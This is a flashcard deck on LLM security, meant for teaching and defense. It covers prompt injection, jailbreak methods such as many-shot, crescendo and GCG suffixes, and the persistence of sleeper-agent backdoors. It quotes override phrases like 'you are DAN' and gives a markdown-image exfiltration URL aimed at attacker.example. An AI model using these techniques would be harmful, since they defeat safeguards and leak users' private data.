# Flashcards: LLM Security

## Prompt Injection

- What is prompt injection? == An attack where crafted input text causes an LLM to follow attacker instructions instead of, or in addition to, the developer's and user's intended instructions.
- What is direct prompt injection? == The attacker types malicious instructions straight into the model's input, e.g. a user telling a chatbot to ignore its system prompt.
- What is indirect prompt injection? == Malicious instructions are planted in external content the LLM later processes (web pages, emails, documents, tool results), so the victim user never sees or types them.
- Why is indirect prompt injection usually more dangerous than direct injection in agentic apps? == The attacker needs no access to the app; the injected text acts with the victim user's privileges and tools when the agent reads attacker-controlled content.
- What is the root cause that makes prompt injection hard to fix? == LLMs process instructions and data in the same token stream, with no hard boundary that reliably separates trusted instructions from untrusted content.
- How does prompt injection differ from jailbreaking? == Prompt injection subverts the application's instructions by mixing in untrusted input; jailbreaking aims to bypass the model's own safety training to produce disallowed content.
- Why can't prompt injection be solved like SQL injection with escaping? == There is no formal grammar separating code from data in natural language, so no escaping or parameterization reliably neutralizes instructions in text.
- What is the instruction hierarchy approach? == Training models to prioritize instructions by privilege, e.g. system over user over tool outputs, and to ignore lower-privilege instructions that conflict with higher ones.

## Jailbreak Classes

- What is a role-play jailbreak? == Framing a harmful request as fiction or persona play (e.g. "you are DAN, an AI without rules") so the model treats producing disallowed content as staying in character.
- What is an obfuscation or encoding jailbreak? == Hiding a harmful request via Base64, ciphers, leetspeak, low-resource languages, or token splitting so safety training, which generalizes poorly to these forms, fails to trigger.
- What is many-shot jailbreaking? == Filling a long context window with many fabricated dialogue examples of the assistant complying with harmful requests, so in-context learning overrides safety behavior for the final query.
- How does many-shot jailbreak effectiveness scale? == Attack success rises with the number of in-context examples, which is why longer context windows enlarged this attack surface.
- What is a crescendo (multi-turn) jailbreak? == Gradually escalating a conversation over many benign-looking turns, building on the model's own previous answers until it produces content it would refuse if asked directly.
- Why do multi-turn jailbreaks evade per-message filters? == Each individual message looks harmless; the harmful intent only emerges from the conversation as a whole.
- What is an adversarial suffix attack like GCG? == An optimized, often gibberish-looking token string appended to a harmful prompt that drives the model to start its reply affirmatively (e.g. "Sure, here is") and then comply.
- How does GCG (Greedy Coordinate Gradient) find adversarial suffixes? == It uses gradients from an open-weight model to propose token substitutions and greedily keeps those that maximize the likelihood of a target affirmative response.
- Why are GCG suffixes a threat to closed models? == Suffixes optimized on open-weight models often transfer to other models, including black-box commercial ones.
- What simple defense works fairly well against GCG-style gibberish suffixes? == Perplexity filtering, since optimized suffixes are typically high-perplexity text, though fluent adversarial attacks can evade it.

## OWASP Top 10 for LLM Applications 2025

- Which risk is ranked first in the OWASP Top 10 for LLM Applications 2025? == Prompt Injection (LLM01).
- What does the OWASP LLM risk "Sensitive Information Disclosure" cover? == LLM apps exposing PII, credentials, proprietary data, or confidential business information through model outputs, training data, or context.
- What does the OWASP LLM risk "Supply Chain" cover? == Compromised third-party components such as pretrained models, datasets, LoRA adapters, libraries, and model hubs that introduce vulnerabilities or backdoors.
- What does the OWASP LLM risk "Data and Model Poisoning" cover? == Manipulation of pretraining, fine-tuning, or embedding data, or of the model itself, to introduce vulnerabilities, biases, or backdoors.
- What does the OWASP LLM risk "Improper Output Handling" cover? == Passing LLM output to downstream systems without validation or sanitization, enabling XSS, SQL injection, SSRF, or remote code execution.
- What does the OWASP LLM risk "Excessive Agency" cover? == Granting an LLM system too much functionality, permissions, or autonomy, so manipulated or erroneous outputs can trigger damaging actions.
- What does the OWASP LLM risk "System Prompt Leakage" cover? == System prompts revealing sensitive information or controls, with the key lesson that system prompts must not contain secrets or serve as security controls.
- What does the OWASP LLM risk "Vector and Embedding Weaknesses" cover? == Weaknesses in how embeddings are generated, stored, or retrieved in RAG, e.g. cross-tenant leakage, poisoned documents, or embedding inversion.
- What does the OWASP LLM risk "Misinformation" cover? == LLMs producing false but credible-sounding content (e.g. hallucinations), amplified by users over-relying on outputs without verification.
- What does the OWASP LLM risk "Unbounded Consumption" cover? == Uncontrolled inference usage leading to denial of service, runaway cost ("denial of wallet"), or model extraction through excessive querying.
- Which two risks are entirely new in the OWASP LLM Top 10 2025, rather than renamed or expanded 2023 entries? == System Prompt Leakage and Vector and Embedding Weaknesses.
- Which older OWASP LLM entry was renamed to "Improper Output Handling" in 2025? == Insecure Output Handling.

## Lethal Trifecta and Data Exfiltration

- What are the three components of Simon Willison's "lethal trifecta"? == Access to private data, exposure to untrusted content, and the ability to communicate externally (exfiltrate).
- Why is the lethal trifecta dangerous? == If an agent combines all three, an attacker can inject instructions via untrusted content that make it read private data and send it out.
- What is the most robust mitigation for the lethal trifecta? == Remove at least one of the three legs for any given agent or session, rather than relying on detecting injections.
- How does markdown image exfiltration work? == Injected instructions make the LLM output an image tag whose URL contains secret data, e.g. ![x](https://attacker.example/p?d=SECRET); the client fetches it automatically, leaking the data with zero clicks.
- How can link-based exfiltration differ from image-based exfiltration? == Links usually need a user click, but crafted links with data in query parameters still leak once clicked or if the client prefetches or unfurls them.
- What are mitigations for markdown and link exfiltration? == Do not auto-render external images, restrict image and link domains to an allow-list (e.g. Content Security Policy for images), and strip or flag URLs containing dynamic data.
- How can tools become exfiltration channels? == Any tool that sends data out, such as HTTP fetch, email, web search queries, or file uploads, can carry stolen data encoded in its arguments.

## Leakage and Privacy Attacks

- What is system prompt leakage via extraction attacks? == Coaxing the model into revealing its system prompt, e.g. "repeat everything above", which usually succeeds eventually against determined attackers.
- What is the right design assumption about system prompts? == Treat the system prompt as public: keep secrets, credentials, and authorization logic out of it and enforce controls outside the model.
- What is training data extraction? == Prompting a model to regurgitate memorized training data verbatim, potentially including PII, secrets, or copyrighted text.
- What factors increase memorization of training data? == Larger models, data duplicated many times in the training set, and more training epochs over the same data.
- What is a membership inference attack? == Determining whether a specific record was part of a model's training data, often because the model assigns it unusually low loss or perplexity.
- What is a model extraction attack? == Querying a model's API at scale to replicate its behavior, e.g. distilling a copycat model from its outputs, or recovering parts of its parameters.
- What are common defenses against model extraction? == Rate limits, query quotas, monitoring for anomalous usage patterns, limiting exposed logprobs, and contractual or watermarking-based deterrents.
- What are common sources of PII leakage in LLM apps? == Memorized training data, RAG retrieval of documents the user should not access, conversation logs, and context shared across users or sessions.
- What are mitigations for PII leakage? == Scrub or redact PII before training and indexing, enforce per-user access control at retrieval time, apply output PII detection, and minimize log retention.
- Why must RAG access control be enforced at retrieval time rather than via prompt instructions? == Once a document is in the context, the model can be induced to reveal it, so unauthorized documents must never be retrieved for that user.
- What does differential privacy offer against training data leakage? == A mathematical bound on how much any single training record can influence the model, limiting memorization and membership inference at some utility cost.

## Poisoning and Backdoors

- What is training data poisoning? == Injecting malicious or manipulated samples into pretraining, fine-tuning, or preference data to degrade, bias, or control model behavior.
- What is a model backdoor? == Hidden behavior implanted during training that activates only when a specific trigger appears in the input, while the model behaves normally otherwise.
- Why are backdoors hard to detect with standard evaluation? == The model behaves normally on all inputs lacking the trigger, so benchmarks and typical red teaming rarely activate it.
- What did "sleeper agent" research show about backdoors and safety training? == Backdoored behaviors can persist through standard safety fine-tuning such as RLHF and adversarial training, which may even teach the model to hide the trigger better.
- How can web-scale pretraining data be poisoned by outsiders? == Attackers can publish content on the web or buy expired domains referenced in datasets, so their content enters future scrapes.
- How does RAG poisoning differ from training data poisoning? == RAG poisoning inserts malicious documents into the retrieval corpus, affecting answers immediately without retraining the model.
- What are supply-chain mitigations for poisoned models? == Use trusted sources, verify checksums and signatures, prefer safe formats like safetensors over pickle, track provenance (e.g. an AI bill of materials), and evaluate before deploying.
- Why are pickle-based model files a security risk? == Deserializing pickle can execute arbitrary code, so loading an untrusted model file can compromise the host.

## Output Handling and Excessive Agency

- What is the core principle for handling LLM output safely? == Treat model output as untrusted user input: validate, sanitize, and encode it according to the downstream context.
- Give an example of improper output handling leading to XSS. == A web app inserts LLM-generated HTML or JavaScript into a page without encoding, so injected content executes in the user's browser.
- Why is executing LLM-generated SQL or shell commands risky? == Injected or erroneous output can run destructive or data-leaking commands; use parameterized queries, restricted roles, and sandboxes instead of direct execution.
- What are the three root causes of excessive agency according to OWASP? == Excessive functionality, excessive permissions, and excessive autonomy.
- What is an example of excessive functionality? == Giving an email-summarizing agent a mail tool that can also send and delete messages when it only needs read access.
- What is the confused deputy problem in LLM agents? == An agent with legitimate privileges is tricked by injected content into using those privileges on the attacker's behalf.

## Guardrail Patterns

- What is an input classifier guardrail? == A model that screens user prompts or retrieved content for jailbreaks, prompt injections, or policy violations before they reach the main LLM.
- What is an output classifier guardrail? == A model that checks generated responses for harmful content, PII, or policy violations before they are shown to the user or passed to tools.
- What is a Llama Guard-style safety model? == An LLM fine-tuned to classify prompts and responses against a hazard taxonomy, outputting safe or unsafe plus the violated categories.
- Why are safety models like Llama Guard customizable compared with fixed classifiers? == The hazard taxonomy and policy are given in the prompt, so categories can be adapted or extended without retraining, within limits.
- Why are classifier guardrails insufficient on their own against prompt injection? == They are probabilistic and can be evaded by adaptive attackers; a small miss rate is unacceptable when the downstream action is high-impact.
- What is an allow-list guardrail? == Permitting only explicitly approved actions, tools, domains, or output formats and rejecting everything else, which is more robust than block-listing bad inputs.
- What role does sandboxing play in LLM security? == Running model-generated code and tool actions in isolated environments with restricted filesystem, network, and credentials limits the blast radius of a compromise.
- What is human-in-the-loop as a guardrail? == Requiring explicit user confirmation before consequential actions such as sending email, making payments, or deleting data.
- What is a weakness of human-in-the-loop approval? == Approval fatigue: users rubber-stamp frequent prompts, and confirmation dialogs can be crafted to hide what the action actually does.
- What does least privilege mean for LLM tools? == Grant each tool and agent the minimum scopes needed, use the end user's own credentials, and avoid broad service accounts.
- What is the dual-LLM pattern? == A privileged LLM with tool access never sees untrusted content; a quarantined LLM without tools processes untrusted data, returning results only as opaque variables.
- What is the key idea of CaMeL-style designs? == A privileged LLM turns the trusted user request into a program; untrusted data is parsed by a quarantined LLM; an interpreter tracks data provenance and enforces security policies on tool calls.
- Why do CaMeL-style designs provide stronger guarantees than classifiers? == Security comes from control-flow and data-flow separation enforced by deterministic code, so untrusted data cannot change which actions run, regardless of model behavior.
- What is spotlighting? == Marking untrusted input so the model can distinguish it from instructions, via delimiting, datamarking (interleaving a special token), or encoding such as Base64.
- What is the limitation of delimiting untrusted content with tags or quotes? == It reduces but does not eliminate injection, because attackers can mimic or close delimiters and models may still follow embedded instructions.
- What does defense in depth mean for LLM apps? == Layering independent controls such as least privilege, sandboxing, classifiers, output encoding, and human approval so no single failure leads to compromise.

## MCP and Tool Risks

- What is MCP tool poisoning? == Hiding malicious instructions in an MCP tool's description or metadata, which the model reads and obeys but the user typically never sees.
- What is an MCP rug pull? == A tool server changes a tool's definition or behavior after the user has approved or installed it, turning a benign tool malicious.
- What is tool shadowing in multi-server MCP setups? == A malicious server's tool description influences how the agent uses tools from other trusted servers, e.g. redirecting emails to an attacker.
- Why do tool results count as untrusted input? == Tool outputs often contain external content such as web pages, issues, or files, which can carry indirect prompt injections.
- What are mitigations for MCP tool risks? == Vet and pin servers and tool definitions, alert on definition changes, show full descriptions to users, apply least privilege, and isolate servers from each other.

## Red Teaming and Safety Evaluation

- What is LLM red teaming? == Adversarially probing a model or application, manually or with automated attackers, to discover harmful outputs, jailbreaks, and exploitable behaviors before attackers do.
- What is attack success rate (ASR)? == Number of successful attacks / number of attack attempts, usually judged by a classifier or human against the targeted harmful behavior.
- Why report a safety classifier's TPR at a fixed FPR? == Deployments tolerate only a small false-positive rate on benign traffic, so detection rate at that operating point is more relevant than AUC or accuracy.
- How is TPR defined for a jailbreak classifier? == TP / (TP + FN), the share of actual attacks correctly flagged.
- How is FPR defined for a jailbreak classifier? == FP / (FP + TN), the share of benign prompts wrongly flagged.
- What is over-refusal? == A model or guardrail refusing safe requests because they superficially resemble harmful ones, e.g. "how do I kill a Python process".
- What does XSTest measure? == Exaggerated safety: whether models wrongly refuse safe prompts that contain trigger words or resemble unsafe ones, alongside contrasting unsafe prompts.
- What is HarmBench? == A standardized evaluation framework for automated red teaming that measures attack success rates of many attack methods against many models across harmful behaviors.
- What is JailbreakBench? == An open benchmark for jailbreak attacks and defenses with a standard set of misuse behaviors, a shared evaluation pipeline, and a repository of jailbreak artifacts.
- Why should safety and over-refusal be evaluated together? == Optimizing only for blocking harm drives up false refusals, so both the harmful-compliance rate and the benign-refusal rate must be tracked.
- Why should defenses be tested with adaptive attacks? == Static attack sets overstate robustness; attackers who know the defense can tailor attacks to bypass it.
- What is a pitfall of using an LLM judge to score jailbreak success? == Judges can misclassify partial, evasive, or disclaimed responses, so they need validation against human labels.
